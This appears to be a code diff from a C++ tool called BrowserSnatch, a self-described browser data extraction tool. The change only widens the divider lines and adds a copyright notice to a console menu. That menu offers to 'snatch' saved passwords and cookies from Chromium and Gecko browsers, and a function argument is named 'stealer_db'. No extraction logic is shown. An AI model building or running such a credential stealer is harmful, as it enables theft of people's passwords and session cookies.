@@ -45,16 +45,16 @@ void Visualizer::printDivider(char ch, int length) {
 // Function to print the menu
 void Visualizer::printMenu() {
     clearConsole();
-    printDivider('=', 60);
-    std::cout << "    \033[1;32mBrowserSnatch\033[0m - All in one Browser Data Extraction Tool" << std::endl;
-    printDivider('=', 60);
+    printDivider('=', 75);
+    std::cout << "    \033[1;32mBrowserSnatch\033[0m - All in one Browser Data Extraction Tool © shaddy43" << std::endl;
+    printDivider('=', 75);
     std::cout << "\n \033[1;36m[1]\033[0m Snatch Chromium Based Browser Passwords" << std::endl;
     std::cout << " \033[1;36m[2]\033[0m Snatch Gecko Based Browser Passwords" << std::endl;
     std::cout << " \033[1;36m[3]\033[0m Snatch Chromium Based Browser Cookies" << std::endl;
     std::cout << " \033[1;36m[4]\033[0m Snatch Gecko Based Browser Cookies" << std::endl;
     std::cout << " \033[1;36m[5]\033[0m Snatch Everything {default settings}" << std::endl;
     std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
-    printDivider('=', 60);
+    printDivider('=', 75);
 }
 
 BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
